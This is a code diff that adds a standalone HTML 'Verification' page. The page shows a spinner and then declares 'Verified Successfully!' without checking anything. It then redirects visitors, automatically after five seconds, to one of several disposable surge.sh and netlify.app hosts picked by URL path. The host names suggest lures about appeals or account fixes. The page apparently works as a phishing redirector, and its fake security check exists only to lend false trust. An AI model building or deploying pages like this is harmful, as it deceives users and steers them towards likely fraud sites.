@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Verification</title>
+  <style>
+    body{
+      margin:0;height:100vh;display:flex;align-items:center;justify-content:center;
+      background:#f2f2f2;font-family:Arial,sans-serif
+    }
+    .box{
+      background:#fff;padding:35px;border-radius:14px;text-align:center;
+      width:320px;box-shadow:0 10px 30px rgba(0,0,0,.15)
+    }
+    .ring{
+      width:140px;height:140px;border-radius:50%;
+      background:conic-gradient(#4caf50,#2196f3,#ff9800,#f44336,#4caf50);
+      animation:spin 2s linear infinite;margin:0 auto 20px;
+      display:flex;align-items:center;justify-content:center
+    }
+    .core{
+      width:100px;height:100px;background:#fff;border-radius:50%;
+      font-size:42px;display:flex;align-items:center;justify-content:center
+    }
+    button{
+      display:none;margin-top:20px;padding:12px 25px;border:none;
+      background:#1976d2;color:#fff;font-size:16px;border-radius:6px;cursor:pointer
+    }
+    .path-info{
+      font-size:12px;color:#666;margin-top:10px;padding:8px;
+      background:#f5f5f5;border-radius:4px;display:inline-block;
+    }
+    @keyframes spin{to{transform:rotate(360deg)}}
+  </style>
+</head>
+<body>
+
+<div class="box">
+  <div class="ring" id="ring">
+    <div class="core" id="core"></div>
+  </div>
+  <p id="text">Verifying…</p>
+  <div id="pathDisplay" class="path-info"></div>
+  <button id="btn">Continue</button>
+</div>
+
+<script>
+  // Get current path from URL
+  function getCurrentPath() {
+    // Remove domain and get path
+    const path = window.location.pathname;
+    // Remove leading/trailing slashes
+    return path.replace(/^\/|\/$/g, '');
+  }
+
+  // Redirect URLs
+  const links = {
+    fix: "https://get-info-for-apply.surge.sh/",
+    guide: "https://get-info-for-apply.surge.sh/",
+    info: "https://agent-fix-an-lebal.surge.sh/",
+    get: "https://get-info-appeal-feedback.surge.sh/",
+    for: "https://info-for-apply-get.surge.sh/",
+    an: "https://agent-fix-an.surge.sh/",
+    sub: "https://agent-fix-an-mark.surge.sh/",
+    submi: "https://for-simple-fix.surge.sh/",
+    lets: "https://request-feedback-lets.surge.sh/",
+    default: "https://get-info-fix-problem.netlify.app/"
+  };
+
+  // Get current path
+  const currentPath = getCurrentPath();
+  console.log("Current path detected:", currentPath);
+  
+  // Get redirect URL
+  const redirectURL = links[currentPath] || links.default;
+  console.log("Will redirect to:", redirectURL);
+
+  // Show path info
+  document.getElementById('pathDisplay').innerHTML = 
+    `Path: <strong>${currentPath || 'root'}</strong><br>
+     Redirect: ${redirectURL}`;
+
+  // Animation and verification
+  setTimeout(() => {
+    document.getElementById("ring").style.animation = "none";
+    document.getElementById("ring").style.background = "#4CAF50";
+    document.getElementById("core").innerHTML = "✔";
+    document.getElementById("text").innerText = "Verified Successfully!";
+    document.getElementById("btn").style.display = "inline-block";
+  }, 2000);
+
+  // Button click handler
+  document.getElementById("btn").onclick = () => {
+    console.log("Redirecting to:", redirectURL);
+    window.location.href = redirectURL;
+  };
+
+  // Also redirect automatically after 5 seconds
+  setTimeout(() => {
+    if(document.getElementById("btn").style.display === "inline-block") {
+      console.log("Auto-redirecting...");
+      window.location.href = redirectURL;
+    }
+  }, 5000);
+</script>
+</body>
+</html>
